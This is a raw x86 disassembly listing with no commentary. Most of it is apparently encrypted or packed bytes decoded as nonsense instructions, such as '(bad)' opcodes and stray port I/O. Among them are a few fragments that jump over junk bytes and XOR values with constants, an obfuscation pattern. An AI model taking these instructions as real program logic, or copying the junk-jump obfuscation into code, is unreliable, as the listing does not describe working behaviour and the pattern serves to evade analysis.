  419f7f:	push   es
  419f80:	xlat   BYTE PTR ds:[ebx]
  419f81:	cmp    bl,dh
  419f83:	lea    edx,[esi+0x1a]
  419f86:	(bad)  
  419f87:	and    DWORD PTR [esi-0x47384ecb],edx
  419f8d:	popa   
  419f8e:	in     al,dx
  419f8f:	lods   eax,DWORD PTR ds:[esi]
  419f90:	sbb    bh,dl
  419f92:	out    0x3f,al
  419f94:	dec    ebp
  419f95:	fwait
  419f96:	xchg   esi,eax
  419f97:	dec    ebp
  419f98:	cdq    
  419f99:	cli    
  419f9a:	clc    
  419f9b:	xchg   dx,ax
  419f9d:	fisubr DWORD PTR [ebx+0x30]
  419fa0:	pusha  
  419fa1:	sar    edx,cl
  419fa3:	ins    DWORD PTR es:[edi],dx
  419fa4:	xlat   BYTE PTR ds:[ebx]
  419fa5:	les    esi,FWORD PTR [ecx-0x2c]
  419fa8:	stc    
  419fa9:	shl    edx,0x38
  419fac:	pusha  
  419fad:	ins    DWORD PTR es:[edi],dx
  419fae:	sti    
  419faf:	xor    ch,cl
  419fb1:	adc    BYTE PTR [eax],al
  419fb3:	and    DWORD PTR [ebp+0x27],esp
  419fb6:	mov    esi,0xc2392a4f
  419fbb:	out    dx,al
  419fbc:	in     eax,dx
  419fbd:	stc    
  419fbe:	and    BYTE PTR [edx+0x30c585c4],ah
  419fc4:	ds mov eax,edi
  419fc7:	mov    DWORD PTR [ebp-0x4],0x467e
  419fce:	jmp    0x41a09b
  419fd3:	xor    al,0xab
  419fd5:	xchg   esp,eax
  419fd6:	outs   dx,DWORD PTR ds:[esi]
  419fd7:	lahf   
  419fd8:	jg     0x419fd9
  419fda:	sti    
  419fdb:	or     eax,0x6995a191
  419fe0:	cs xor al,0x65
  419fe3:	leave  
  419fe4:	sub    al,BYTE PTR [ecx]
  419fe6:	add    BYTE PTR [eax+0xa000000],dh
  419fec:	mov    dl,0x7
  419fee:	int3   
  419fef:	mov    ss,WORD PTR ds:0xee83ef40
  419ff5:	(bad)  
  419ff6:	adc    al,0x77
  419ff8:	ins    DWORD PTR es:[edi],dx
  419ff9:	xchg   esp,eax
  419ffa:	loope  0x41a006
  419ffc:	add    ebx,DWORD PTR [edi+0x27]
  419fff:	and    ah,BYTE PTR [edx+0x5]
  41a002:	jb     0x41a01d
  41a004:	pop    ecx
  41a005:	aas    
  41a006:	cmp    ebx,eax
  41a008:	jl     0x419fc5
  41a00a:	test   DWORD PTR ds:0x98ace1f9,0xeb7113bf
  41a014:	sbb    al,0x5a
  41a016:	ss aam 0x9b
  41a019:	xor    BYTE PTR [edx],bl
  41a01b:	arpl   WORD PTR [eax+0x12],cx
  41a01e:	adc    al,0x4f
  41a020:	sub    BYTE PTR [edi-0x6fb6f43e],cl
  41a026:	cwde   
  41a027:	and    al,0x5b
  41a029:	enter  0x532,0x3c
  41a02d:	sbb    bl,BYTE PTR [ebp+edi*1+0x54]
  41a031:	ja     0x41a041
  41a033:	loope  0x41a049
  41a035:	lock fist WORD PTR [esi+eax*1+0x2a679cc1]
  41a03d:	or     ch,BYTE PTR [ecx+0x4ca8a41a]
  41a043:	jns    0x419fe6
  41a045:	push   DWORD PTR [ebx]
  41a047:	int3   
  41a048:	aam    0xc3
  41a04a:	ret    0x117
  41a04d:	mov    ebx,0x2062e709
  41a052:	sub    DWORD PTR ds:0x4e748459,eax
  41a058:	push   edx
  41a059:	fbld   TBYTE PTR [ebp-0x62701f7d]
  41a05f:	adc    cl,bh
  41a061:	mov    eax,0x30e1c09f
  41a066:	cmc    
  41a067:	loope  0x41a0b4
  41a069:	xchg   esp,eax
  41a06a:	adc    edx,DWORD PTR [esi+0x364042f]
  41a070:	push   ecx
  41a071:	inc    esp
  41a072:	call   FWORD PTR [edi+0x684b6316]
  41a078:	popf   
  41a079:	(bad)  
  41a07a:	or     al,0xda
  41a07c:	and    edi,DWORD PTR [edx-0x77e86815]
  41a082:	dec    esi
  41a083:	std    
  41a084:	cdq    
  41a085:	pop    edx
  41a086:	adc    eax,0x6dc50ae3
  41a08b:	aaa    
  41a08c:	or     DWORD PTR [eax+0x1ffa9c9a],ebx
  41a092:	and    al,0x45
  41a094:	test   eax,0x14ec9007
  41a099:	int3   
  41a09a:	and    BYTE PTR [ebx+0x4d8bf845],cl
  41a0a0:	cld    
  41a0a1:	push   0xecb
  41a0a6:	push   ecx
  41a0a7:	push   eax
  41a0a8:	jmp    0x41a175
  41a0ad:	fsub   QWORD PTR [eax-0x3282339f]
  41a0b3:	std    
  41a0b4:	mov    al,0xb8
  41a0b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0b7:	pop    ebp
  41a0b8:	ret    
  41a0b9:	mov    ebp,DWORD PTR [eax]
  41a0bb:	lds    ecx,FWORD PTR [esi+0x79]
  41a0be:	sub    eax,DWORD PTR [ecx]
  41a0c0:	add    BYTE PTR [eax+0x35000000],dh
  41a0c6:	lea    edx,[ebx+0x5d049401]
  41a0cc:	mov    ds:0x2efd92ef,eax
  41a0d1:	lods   al,BYTE PTR ds:[esi]
  41a0d2:	pop    ebx
  41a0d3:	jb     0x41a0eb
  41a0d5:	outs   dx,BYTE PTR ds:[esi]
  41a0d6:	std    
  41a0d7:	or     BYTE PTR [edx],bh
  41a0d9:	sbb    al,0x9f
  41a0db:	or     eax,0x8fdfe401
  41a0e0:	imul   esi,DWORD PTR [esp+ebp*2-0x74],0xffffffe2
  41a0e5:	(bad)  
  41a0e6:	call   0xf8247132
  41a0eb:	and    DWORD PTR [ecx+0x2f654747],ecx
  41a0f1:	cmp    DWORD PTR [edi],eax
  41a0f3:	imul   esi,ebx,0xffffff88
  41a0f6:	mov    eax,ds:0xdd19fc14
  41a0fb:	xor    eax,DWORD PTR [ebp-0x6f]
  41a0fe:	mov    al,BYTE PTR [ebp-0x780c66d6]
  41a104:	and    eax,edx
  41a106:	dec    ecx
  41a107:	sbb    ebp,eax
  41a109:	das    
  41a10a:	xchg   ebx,eax
  41a10b:	ds push edx
  41a10d:	mov    dl,0x8f
  41a10f:	mov    ch,0x75
  41a111:	cmp    DWORD PTR [ebp+ebp*1+0x3e503456],eax
  41a118:	fisub  DWORD PTR [ebp+0x77]
  41a11b:	jnp    0x41a0ca
  41a11d:	bound  esi,QWORD PTR [ebx-0x257498ea]
  41a123:	adc    edx,esi
  41a125:	sub    al,0x7e
  41a127:	cdq    
  41a128:	cli    
  41a129:	push   ebp
  41a12a:	push   DWORD PTR [esi+0x36cbeb86]
  41a130:	fcmovb st,st(6)
  41a132:	clc    
  41a133:	dec    ebx
  41a134:	(bad)  [edx+eax*8-0x39]
  41a138:	cdq    
  41a139:	jle    0x41a0e9
  41a13b:	out    0xb4,al
  41a13d:	mov    bl,0xc4
  41a13f:	xchg   ecx,eax
  41a140:	push   0x685e43b7
  41a145:	push   es
  41a146:	std    
  41a147:	adc    al,0x72
  41a149:	in     eax,0x49
  41a14b:	push   0xffffffec
  41a14d:	gs mov esi,0x4f2d3c17
  41a153:	mov    esi,0x9d476b03
  41a158:	sub    ah,BYTE PTR [edx]
  41a15a:	lock nop
  41a15c:	or     al,0xb2
  41a15e:	test   DWORD PTR [ebp+0x6e],eax
  41a161:	mov    dh,dl
  41a163:	add    DWORD PTR [eax+0x51f79255],0xd583c61a
  41a16d:	push   eax
  41a16e:	test   al,ah
  41a170:	sbb    eax,ebx
  41a172:	jmp    0x552a8c6e
  41a177:	dec    ecx
  41a178:	add    DWORD PTR [eax],eax
  41a17a:	mov    ecx,DWORD PTR [ebp-0x10]
  41a17d:	mov    esi,DWORD PTR [ebp-0xc]
  41a180:	sub    eax,ecx
  41a182:	mov    ecx,DWORD PTR [ebp-0x18]
  41a185:	sbb    edx,esi
  41a187:	jmp    0x41a254
  41a18c:	ins    BYTE PTR es:[edi],dx
  41a18d:	mov    cl,0xc8
  41a18f:	rcr    ch,1
  41a191:	stc    
  41a192:	jl     0x41a151
  41a194:	add    ah,BYTE PTR [ebx-0x1adeee1b]
  41a19a:	jecxz  0x41a1db
  41a19c:	sub    DWORD PTR [ecx+eax*1],ebp
  41a19f:	add    BYTE PTR [eax-0x27000000],dh
  41a1a5:	daa    
  41a1a6:	in     al,dx
  41a1a7:	mov    BYTE PTR [eax+0x6a1826c5],ah
  41a1ad:	outs   dx,BYTE PTR ds:[esi]
  41a1ae:	in     eax,0xdf
  41a1b0:	lods   eax,DWORD PTR ds:[esi]
  41a1b1:	fwait
  41a1b2:	sti    
  41a1b3:	popa   
  41a1b4:	sbb    BYTE PTR [esi],ah
  41a1b6:	add    al,0x6
  41a1b8:	xchg   al,dl
  41a1ba:	mov    eax,0x1af00a58
  41a1bf:	push   0xfffffffa
  41a1c1:	mov    eax,ds:0xe004e0bd
  41a1c6:	xlat   BYTE PTR ds:[ebx]
  41a1c7:	mov    dl,BYTE PTR [esi-0x3a]
  41a1ca:	or     al,0x4c
  41a1cc:	pop    es
  41a1cd:	mov    edi,gs
  41a1cf:	jg     0x41a21e
  41a1d1:	cwde   
  41a1d2:	mov    dh,0x3f
  41a1d4:	and    DWORD PTR cs:[ebx-0x75],0xffffff86
  41a1d9:	cld    
  41a1da:	mov    bh,ch
  41a1dc:	std    
  41a1dd:	out    dx,al
  41a1de:	pop    esi
  41a1df:	push   ebp
  41a1e0:	pop    esp
  41a1e1:	jle    0x41a186
  41a1e3:	in     al,0x4e
  41a1e5:	xchg   ecx,eax
  41a1e6:	sub    al,0x4e
  41a1e8:	mov    dh,0x2c
  41a1ea:	enter  0x2d9e,0xa0
  41a1ee:	(bad)  
  41a1ef:	dec    edi
  41a1f0:	mov    ch,0xd0
  41a1f2:	jb     0x41a1f6
  41a1f4:	fcmovnbe st,st(1)
  41a1f6:	or     cl,BYTE PTR [eax-0x4b]
  41a1f9:	jp     0x41a1ed
  41a1fb:	push   es
  41a1fc:	cmp    BYTE PTR [edx+0x5b],bh
  41a1ff:	test   DWORD PTR [edx-0x6c],edi
  41a202:	(bad)
  41a206:	retf   0xc80a
  41a209:	jge    0x41a236
  41a20b:	shld   ebp,ebp,cl
  41a20e:	sub    ah,BYTE PTR [edi+0x7d]
  41a211:	inc    esi
  41a212:	mov    eax,ds:0x62d32a7c
  41a217:	dec    ecx
  41a218:	je     0x41a1b4
  41a21a:	ds pop ebp
  41a21c:	enter  0xd015,0x6
  41a220:	mov    ds:0x4f7ac4a5,eax
  41a225:	jl     0x41a211
  41a227:	push   cs
  41a228:	jno    0x41a29a
  41a22a:	sbb    DWORD PTR [ebx+0x6482b7f0],ebx
  41a230:	pop    ss
  41a231:	and    ecx,DWORD PTR [ebx-0x4f186d0f]
  41a237:	cmp    cl,ah
  41a239:	sahf   
  41a23a:	fstp   DWORD PTR [eax+0x3ccb78c1]
  41a240:	es js  0x41a24d
  41a243:	out    0xb2,eax
  41a245:	sub    ch,BYTE PTR [esi-0x71]
  41a248:	jmp    0xc75b:0x3bccce87
  41a24f:	push   es
  41a250:	push   ecx
  41a251:	shl    BYTE PTR [esi-0x138a74e8],1
  41a257:	jmp    0x41a324
  41a25c:	fidiv  WORD PTR [esi+0x4]
  41a25f:	xchg   ecx,eax
  41a260:	lods   al,BYTE PTR ds:[esi]
  41a261:	repz fistp QWORD PTR [edi+0x67]
  41a265:	sub    edi,DWORD PTR [edx+0x73a30792]
  41a26b:	pop    edi
  41a26c:	fldcw  WORD PTR [ecx+eax*1]
  41a26f:	add    BYTE PTR [eax-0x43000000],dh
  41a275:	ins    BYTE PTR es:[edi],dx
  41a276:	sbb    DWORD PTR [ecx],0x45958aa8
  41a27c:	call   0x2dfa865d
  41a281:	xchg   esp,eax
  41a282:	or     cl,dl
  41a284:	dec    ebp
  41a285:	pushf  
  41a286:	fdivrp st(2),st
  41a288:	mov    al,0x77
  41a28a:	bnd jno 0x41a2a9
  41a28d:	sub    al,0x9
  41a28f:	xlat   BYTE PTR ds:[ebx]
  41a290:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a291:	jmp    0x41a28a
  41a293:	mov    ebp,0x72707868
  41a298:	fild   WORD PTR [ebx]
  41a29a:	inc    esp
  41a29b:	xchg   ecx,eax
  41a29c:	mov    ch,0x79
  41a29e:	jnp    0x41a22a
  41a2a0:	push   ds
  41a2a1:	xor    ch,BYTE PTR [edi]
  41a2a3:	lods   eax,DWORD PTR ds:[esi]
  41a2a4:	iret   
  41a2a5:	jb     0x41a287
  41a2a7:	setp   BYTE PTR [esi-0xa3ee331]
  41a2ae:	sti    
  41a2af:	sbb    BYTE PTR [esi-0x5f],bh
  41a2b2:	jle    0x41a2fb
  41a2b4:	push   edx
  41a2b5:	sbb    al,0xf6
  41a2b7:	out    dx,al
  41a2b8:	pop    eax
  41a2b9:	arpl   ax,bx
  41a2bb:	push   edx
  41a2bc:	add    eax,0x20bb5aa6
  41a2c1:	shr    DWORD PTR ds:0x8c9aaa5c,0x2e
  41a2c8:	rcr    dh,0x2
  41a2cb:	loope  0x41a343
  41a2cd:	ret    
  41a2ce:	push   esi
  41a2cf:	loopne 0x41a27c
  41a2d1:	or     BYTE PTR [eax],0xaa
  41a2d4:	test   al,0xbc
  41a2d6:	xchg   ebp,eax
  41a2d7:	loop   0x41a302
  41a2d9:	mov    eax,ds:0xbce35c74
  41a2de:	ins    DWORD PTR es:[edi],dx
  41a2df:	aad    0xca
  41a2e1:	or     dh,BYTE PTR [ecx]
  41a2e3:	sub    ebx,DWORD PTR [ebx+0x76]
  41a2e6:	nop
  41a2e7:	xor    ebp,DWORD PTR [esi-0x35]
  41a2ea:	lar    ebx,ax
  41a2ed:	ds and DWORD PTR gs:[ebp-0x15],esi
  41a2f2:	icebp  
  41a2f3:	and    al,0x2e
  41a2f5:	dec    esp
  41a2f6:	es or  eax,0xde054a6
  41a2fc:	jb     0x41a2e7
  41a2fe:	push   ss
  41a2ff:	les    ecx,FWORD PTR [eax-0x37]
  41a302:	in     eax,0x6
  41a304:	pop    edx
  41a305:	xchg   edi,eax
  41a306:	scas   eax,DWORD PTR es:[edi]
  41a307:	adc    DWORD PTR [esi],eax
  41a309:	stos   BYTE PTR es:[edi],al
  41a30a:	sbb    ebx,DWORD PTR [edi]
  41a30c:	test   BYTE PTR [eax],al
  41a30e:	and    DWORD PTR [esi],0xffffff99
  41a311:	outs   dx,DWORD PTR ds:[esi]
  41a312:	stc    
  41a313:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a314:	xchg   edi,eax
  41a315:	int    0x46
  41a317:	ja     0x41a2f3
  41a319:	outs   dx,BYTE PTR ds:[esi]
  41a31a:	mov    BYTE PTR [edx],dl
  41a31c:	push   ds
  41a31d:	outs   dx,DWORD PTR ds:[esi]
  41a31e:	lock cmp BYTE PTR [ebx+eax*4],cl
  41a322:	pop    esp
  41a323:	mov    eax,0x4b5525
  41a328:	add    cl,ch
  41a32a:	enter  0x0,0x0
  41a32e:	or     al,BYTE PTR [ebx-0x2e]
  41a331:	jmp    0xdcba:0xe33afbdb
  41a338:	mov    al,ds:0x7b80b033
  41a33d:	pop    edi
  41a33e:	mov    DWORD PTR ds:0xb00001,ebp
  41a344:	add    BYTE PTR [eax],al
  41a346:	mov    ds:0x8c0e66a9,eax
  41a34b:	sbb    ah,BYTE PTR [edx]
  41a34d:	pop    esp
  41a34e:	scas   al,BYTE PTR es:[edi]
  41a34f:	leave  
  41a350:	mov    dl,0x4e
  41a352:	jne    0x41a39a
  41a354:	adc    ah,ah
  41a356:	pop    eax
  41a357:	outs   dx,DWORD PTR ds:[esi]
  41a358:	mov    cl,0xfb
  41a35a:	mov    edi,0x990a7347
  41a35f:	jle    0x41a3ae
  41a361:	sbb    eax,0x29034c43
  41a366:	mov    ebx,DWORD PTR [ebx]
  41a368:	std    
  41a369:	mov    cl,0xc
  41a36b:	(bad)  
  41a36c:	adc    BYTE PTR [edi+ebp*1-0xb5e2ee3],al
  41a373:	mov    esp,DWORD PTR [esi]
  41a375:	xchg   DWORD PTR [ebx-0x4b],esi
  41a378:	cli    
  41a379:	mov    bh,0xbb
  41a37b:	xchg   ebx,eax
  41a37c:	mov    ds,WORD PTR [eax+0x35f518db]
  41a382:	xor    esp,DWORD PTR [eax]
  41a384:	and    DWORD PTR ds:0xb4af625d,eax
  41a38a:	ror    DWORD PTR [edx+0x39],cl
  41a38d:	int3   
  41a38e:	mov    DWORD PTR [esi+edi*8-0x33],esp
  41a392:	repz fistp WORD PTR [ebx-0xe]
  41a396:	sti    
  41a397:	fld    TBYTE PTR [ebx+0x75588586]
  41a39d:	adc    DWORD PTR [esi+0x58],edx
  41a3a0:	sbb    ebx,DWORD PTR [esi-0x19]
  41a3a3:	ins    BYTE PTR es:[edi],dx
  41a3a4:	cmp    dh,ah
  41a3a6:	loopne 0x41a3d0
  41a3a8:	mov    ebx,0xce044d10
  41a3ad:	pop    edi
  41a3ae:	pop    eax
  41a3af:	mov    dh,BYTE PTR [edx]
  41a3b1:	jnp    0x41a3a2
  41a3b3:	popf   
  41a3b4:	fcom   DWORD PTR [edi]
  41a3b6:	pop    esp
  41a3b7:	cmp    BYTE PTR [eax],dl
  41a3b9:	sbb    esp,DWORD PTR [ebx]
  41a3bb:	add    cl,dl
  41a3bd:	shl    DWORD PTR [esi-0x39241e5a],0x7a
  41a3c4:	ja     0x41a3d1
  41a3c6:	sti    
  41a3c7:	lock and ch,BYTE PTR [edi+0x40bdbb9]
  41a3ce:	add    eax,0xaf2a11e7
  41a3d3:	push   es
  41a3d4:	jl     0x41a425
  41a3d6:	xchg   edi,eax
  41a3d7:	in     al,dx
  41a3d8:	add    eax,edx
  41a3da:	test   al,0xf4
  41a3dc:	sahf   
  41a3dd:	popa   
  41a3de:	push   ebp
  41a3df:	test   al,ah
  41a3e1:	and    eax,0xa0c12469
  41a3e6:	pop    esi
  41a3e7:	stc    
  41a3e8:	add    DWORD PTR [edi+0x7d],eax
  41a3eb:	mov    bh,0x83
  41a3ed:	les    esp,FWORD PTR [edx]
  41a3ef:	xlat   BYTE PTR ds:[ebx]
  41a3f0:	call   0xa6b156b0
  41a3f5:	(bad)  
  41a3f6:	xor    eax,ecx
  41a3f8:	and    edx,0x3be5
  41a3fe:	jmp    0x41a4cb
  41a403:	rol    eax,0x8a
  41a406:	jmp    0x41a393
  41a408:	jmp    0x41a3eb
  41a40a:	jmp    0xecf5:0xcd40059a
  41a411:	push   edi
  41a412:	cmp    BYTE PTR [ecx],bh
  41a414:	add    DWORD PTR cs:[eax],eax
  41a417:	mov    al,0x0
  41a419:	add    BYTE PTR [eax],al
  41a41b:	cdq    
  41a41c:	pop    eax
  41a41d:	inc    ebx
  41a41e:	or     BYTE PTR [eax],bh
  41a420:	mov    bl,0xee
  41a422:	outs   dx,BYTE PTR ds:[esi]
  41a423:	inc    ebp
  41a424:	ins    DWORD PTR es:[edi],dx
  41a425:	hlt    
  41a426:	mov    esp,0x72a7820c
  41a42b:	adc    WORD PTR [esi],si
  41a42e:	scas   eax,DWORD PTR es:[edi]
  41a42f:	fwait
  41a430:	lods   eax,DWORD PTR ds:[esi]
  41a431:	push   0xf1add70c
  41a436:	ret    0xd19f
  41a439:	sub    al,0x6d
  41a43b:	adc    eax,0xd6b47922
  41a440:	std    
  41a441:	jmp    0x41a450
  41a443:	dec    esp
  41a444:	sbb    eax,0xba25d584
  41a449:	cs cmp al,0x2f
  41a44c:	ins    DWORD PTR es:[edi],dx
  41a44d:	test   al,0xb4
  41a44f:	add    ah,bl
  41a451:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a452:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a453:	imul   edx,ebp,0x44378ae0
  41a459:	and    BYTE PTR [edi+0x3a],0xb9
  41a45d:	aad    0xf3
  41a45f:	push   eax
  41a460:	xchg   bp,ax
  41a462:	leave  
  41a463:	lea    esi,[ebx-0x5b]
  41a466:	retf   
  41a467:	xchg   edi,eax
  41a468:	pop    ebx
  41a469:	adc    bl,BYTE PTR [esi+0x29]
  41a46c:	in     al,0x5e
  41a46e:	cmp    ah,BYTE PTR [edi]
  41a470:	add    dh,dl
  41a472:	out    0x94,al
  41a474:	dec    ebp
  41a475:	hlt    
  41a476:	clc    
  41a477:	inc    esp
  41a478:	jb     0x41a4a3
  41a47a:	jge    0x41a4d1
  41a47c:	inc    BYTE PTR [eax-0x2408b060]
  41a482:	xor    bl,BYTE PTR [esi+0x6d170153]
  41a488:	cmp    esi,DWORD PTR ds:0x5b2bb394
  41a48e:	int    0x10
  41a490:	popa   
  41a491:	jo     0x41a4c8
  41a493:	pop    ecx
  41a494:	mov    ecx,0xd0f295c0
  41a499:	sbb    ah,BYTE PTR [esi+0x1b9900a]
  41a49f:	jae    0x41a434
  41a4a1:	test   BYTE PTR [ebx-0x7bbab5ec],dh
  41a4a7:	fnstenv [ebx+eax*1+0x3a]
  41a4ab:	shl    DWORD PTR [ecx-0x564b52f],1
  41a4b1:	loopne 0x41a4c7
  41a4b3:	imul   ebp,DWORD PTR [esi],0xffffff8a
  41a4b6:	mov    esp,0xc69deaf
  41a4bb:	outs   dx,BYTE PTR ds:[esi]
  41a4bc:	fnsave [ebx-0x64dfcab9]
  41a4c2:	repnz in eax,0xc5
  41a4c5:	or     esi,DWORD PTR ds:0xf068aabe
  41a4cb:	xor    edx,esi
  41a4cd:	add    eax,0x66473db3
  41a4d2:	adc    edx,0xffff221a
  41a4d8:	mov    edi,0x8dacd260
  41a4dd:	xor    eax,edi
  41a4df:	mov    DWORD PTR [ebp-0x18],eax
  41a4e2:	mov    esi,0xacff
  41a4e7:	xor    edx,esi
  41a4e9:	mov    DWORD PTR [ebp-0x14],edx
  41a4ec:	mov    eax,DWORD PTR [ebp-0x20]
  41a4ef:	mov    ecx,DWORD PTR [ebp-0x1c]
  41a4f2:	mov    edx,DWORD PTR [ebp-0x28]
  41a4f5:	mov    ebx,DWORD PTR [ebp-0x24]
  41a4f8:	and    ecx,ebx
  41a4fa:	and    eax,edx
  41a4fc:	mov    edx,DWORD PTR [ebp-0x30]
  41a4ff:	mov    ebx,DWORD PTR [ebp-0x2c]
  41a502:	add    eax,0xfffff11a
  41a507:	jmp    0x41a5d4
  41a50c:	in     eax,dx
  41a50d:	and    eax,0xbfffb73f
  41a512:	in     eax,dx
  41a513:	jg     0x41a591
  41a515:	fwait
  41a516:	sub    bl,BYTE PTR [edi+0x4e0322ef]
  41a51c:	jmp    0xb041a64f
  41a521:	add    BYTE PTR [eax],al
  41a523:	add    BYTE PTR [edi-0x17],dh
  41a526:	int    0x34
  41a528:	mov    dh,0x22
  41a52a:	test   DWORD PTR [edi+0x72217377],esi
  41a530:	ret    0xa530
  41a533:	call   0xc5a2:0xde804e9b
  41a53a:	aaa    
  41a53b:	jge    0x41a510
  41a53d:	add    al,BYTE PTR [esi+0x6961e144]
  41a543:	pop    ss
  41a544:	or     BYTE PTR [edx+eiz*4],dh
  41a547:	mov    BYTE PTR [esp+eax*2+0x17],bl
  41a54b:	cmp    DWORD PTR [edi-0x46],ebp
  41a54e:	push   esi
  41a54f:	bnd addr16 jns 0x41a594
  41a553:	fst    QWORD PTR [ebx]
  41a555:	or     DWORD PTR [ebp*8+0x75f07e3b],ebx
  41a55c:	addr16 lahf 
  41a55e:	or     sp,sp
  41a561:	xor    BYTE PTR [ecx+esi*8],ch
  41a564:	outs   dx,DWORD PTR ds:[esi]
  41a565:	xchg   ebp,eax
  41a566:	and    DWORD PTR [edi+0x7c],esp
  41a569:	jmp    0x3a3099f7
  41a56e:	pop    es
  41a56f:	mov    esi,0xbd4654e
  41a574:	sbb    BYTE PTR [ebx+0x317eed6b],ah
  41a57a:	(bad)  
  41a57b:	adc    DWORD PTR [esi-0x2d88aea7],edi
  41a581:	imul   esi,DWORD PTR [ecx+eax*4],0x72
  41a585:	xchg   ebp,eax
  41a586:	mov    WORD PTR [edx+ecx*1],ds
  41a589:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a58a:	dec    esi
  41a58b:	mov    ds:0xbae10aca,eax
  41a590:	lds    ebp,FWORD PTR [edi]
  41a592:	push   edi
  41a593:	call   0x62e1:0x277ec0f4
  41a59a:	outs   dx,DWORD PTR ds:[esi]
  41a59b:	or     cl,BYTE PTR [edi-0x44686bae]
  41a5a1:	or     edx,ebp
  41a5a3:	mov    esp,DWORD PTR [ecx-0x19]
  41a5a6:	lods   al,BYTE PTR ds:[esi]
  41a5a7:	lock add al,0x70
  41a5aa:	test   eax,0x1a3d6251
  41a5af:	sbb    ch,cl
  41a5b1:	mul    DWORD PTR [ecx-0x22313635]
  41a5b7:	mov    ebp,0xc1258eba
  41a5bc:	mov    ds:0x5c2ff6af,eax
  41a5c1:	adc    DWORD PTR [edi+0x2d00cdc2],esi
  41a5c7:	mov    bh,ch
  41a5c9:	push   edi
  41a5ca:	xchg   ebp,eax
  41a5cb:	pop    es
  41a5cc:	call   0xd312c9fa
  41a5d1:	in     al,0xcd
  41a5d3:	leave  
  41a5d4:	adc    ecx,0x13f7
  41a5da:	and    eax,0x27e5
  41a5df:	jmp    0x41a6ac
  41a5e4:	and    DWORD PTR [ecx+0x7f],ebx
  41a5e7:	push   ss
  41a5e8:	jg     0x41a620
  41a5ea:	imul   edi,DWORD PTR [edi+0x77],0xa5a192a5
  41a5f1:	sub    dh,bh
  41a5f3:	ins    DWORD PTR es:[edi],dx
  41a5f4:	cdq    
  41a5f5:	das    
  41a5f6:	add    DWORD PTR [eax],eax
  41a5f8:	mov    al,0x0
  41a5fa:	add    BYTE PTR [eax],al
  41a5fc:	test   eax,0xac2298e7
  41a601:	scas   al,BYTE PTR es:[edi]
  41a602:	not    cl
  41a604:	nop
  41a605:	add    esi,DWORD PTR [eax]
  41a607:	cmp    al,BYTE PTR [ebp+0x54b32ced]
  41a60d:	ror    DWORD PTR [edi-0x8],1
  41a610:	ret    0x75f5
  41a613:	int    0xbe
  41a615:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a616:	adc    eax,0x7511bc31
  41a61b:	cdq    
  41a61c:	leave  
  41a61d:	js     0x41a606
  41a61f:	lock mov edx,0xce2e908
  41a625:	out    0x9f,al
  41a627:	ds xor edx,ebx
  41a62a:	jmp    0xe924:0x30b1d97b
  41a631:	push   edi
  41a632:	call   FWORD PTR [edi+ebx*8-0x22c4525f]
  41a639:	shr    al,0x38
  41a63c:	mov    ds:0xb83c55d1,al
  41a641:	pop    edi
  41a642:	cmc    
  41a643:	pop    edx
  41a644:	iret   
  41a645:	(bad)  
  41a646:	adc    eax,0xa5c441d4
  41a64b:	sbb    edx,DWORD PTR [edx]
  41a64d:	dec    eax
  41a64e:	push   edx
  41a64f:	mov    eax,ds:0xfb084f27
  41a654:	repnz out 0xee,al
  41a657:	das    
  41a658:	sub    BYTE PTR [edi+0x79791892],bh
  41a65e:	xchg   edi,eax
  41a65f:	dec    eax
  41a660:	adc    eax,0x9207e445
  41a665:	call   0x73615e0c
  41a66a:	cmp    eax,0x86126e70
  41a66f:	stc    
  41a670:	cld    
  41a671:	sub    bl,BYTE PTR [esi-0x49ce4822]
  41a677:	(bad)  [ebp+0x5c490f2e]
  41a67d:	cmp    BYTE PTR [edi],0x6a
  41a680:	lods   eax,DWORD PTR ds:[esi]
  41a681:	xor    eax,0x338fe5a
  41a686:	mov    ecx,DWORD PTR [esi-0x7a]
  41a689:	inc    ecx
  41a68a:	lods   eax,DWORD PTR ds:[esi]
  41a68b:	(bad)  
  41a68c:	ficomp WORD PTR [edi-0x5e]
  41a68f:	aas    
  41a690:	int3   
  41a691:	mov    eax,ds:0x3876d62f
  41a696:	fisttp DWORD PTR [edx+0x523d99c3]
  41a69c:	cmp    BYTE PTR [ebp+0x1e],bh
  41a69f:	out    dx,al
  41a6a0:	neg    edi
  41a6a2:	enter  0xdd89,0x75
  41a6a6:	scas   al,BYTE PTR es:[edi]
  41a6a7:	pop    ss
  41a6a8:	cmp    DWORD PTR [edx-0x1e7edfce],edi
  41a6ae:	sti    
  41a6af:	jo     0x41a6b1
  41a6b1:	add    cl,ch
  41a6b3:	enter  0x0,0x0
  41a6b7:	sbb    eax,0xff9d6ba3
  41a6bc:	(bad)  
  41a6be:	mov    ds:0x9f7c47b8,eax
  41a6c3:	jo     0x41a680
  41a6c5:	or     ebx,eax
  41a6c7:	dec    ecx
  41a6c8:	xor    BYTE PTR [ecx],al
  41a6ca:	add    BYTE PTR [eax+0x29000000],dh
  41a6d0:	into   
  41a6d1:	pop    ebp
  41a6d2:	push   ecx
  41a6d3:	push   ds
  41a6d4:	sub    esi,DWORD PTR [edi]
  41a6d6:	(bad)  
  41a6d7:	jmp    0x9b559c3d
  41a6dc:	dec    edi
  41a6dd:	ds and eax,0xd9223b41
  41a6e3:	data16 fsubr DWORD PTR [eax+0x602fe8e]
  41a6ea:	jne    0x41a709
  41a6ec:	daa    
  41a6ed:	or     eax,0x37f44058
  41a6f2:	pop    DWORD PTR [edx+0x4af73125]
  41a6f8:	xor    eax,0x7f8d5ddb
  41a6fd:	mov    dl,0x6e
  41a6ff:	xor    esp,edx
  41a701:	aaa    
  41a702:	sbb    BYTE PTR [edx],0x2e
  41a705:	cmp    ah,BYTE PTR [esi+edi*2-0x7c]
  41a709:	retf   0x85d6
  41a70c:	gs jp  0x41a744
  41a70f:	mov    bh,0x6
  41a711:	loopne 0x41a76c
  41a713:	sub    ebp,edi
  41a715:	lahf   
  41a716:	push   esp
  41a717:	loopne 0x41a78f
  41a719:	daa    
  41a71a:	push   ecx
  41a71b:	test   BYTE PTR [esp+eax*4+0x401ef0e9],al
  41a722:	and    ah,BYTE PTR [edx-0x75]
  41a725:	pusha  
  41a726:	(bad)  
  41a728:	rol    DWORD PTR [ecx+edi*2-0x2c],cl
  41a72c:	or     eax,0xcda5a087
